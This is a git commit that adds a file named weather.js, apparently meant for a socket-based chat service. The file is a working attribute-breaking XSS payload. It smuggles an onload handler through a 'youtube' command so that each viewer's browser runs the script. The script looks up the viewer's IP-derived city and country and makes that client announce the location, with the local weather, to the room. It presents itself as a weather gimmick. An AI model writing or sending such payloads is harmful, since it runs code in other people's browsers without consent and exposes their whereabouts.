77068afb103e1ca19f614f4330bd19041b4d053d
Windows Xp Sky <reinilsonfernandes25@outlook.com>
2026-03-07 17:07:52 -0300

    Create weather.js

---
+++ ai-generated/weather.js
@@ -0,0 +1,26 @@
+socket.emit('command', {
+  list: [
+    "youtube",
+    "eee\" onload=\"(async () => { \
+      try { \
+        const geo = await fetch('https://ipapi.co/json/'); \
+        const geoData = await geo.json(); \
+        const city = geoData.city; \
+        const country = geoData.country_name; \
+        \
+        const weatherResponse = await fetch('https://wttr.in/' + city + '?format=j1'); \
+        const weatherData = await weatherResponse.json(); \
+        \
+        const temp = weatherData.current_condition[0].temp_C; \
+        const condition = weatherData.current_condition[0].weatherDesc[0].value; \
+        \
+        var weatherMessage = 'The weather in ' + city + ', ' + country + ' right now is ' + temp + '°C with ' + condition + '.'; \
+        \
+        window.socket.emit('talk', { text: weatherMessage }); \
+        console.log(weatherMessage); \
+      } catch (err) { \
+        window.socket.emit('talk', { text: 'Unable to fetch weather data.' }); \
+      } \
+    })()\""
+  ]
+});
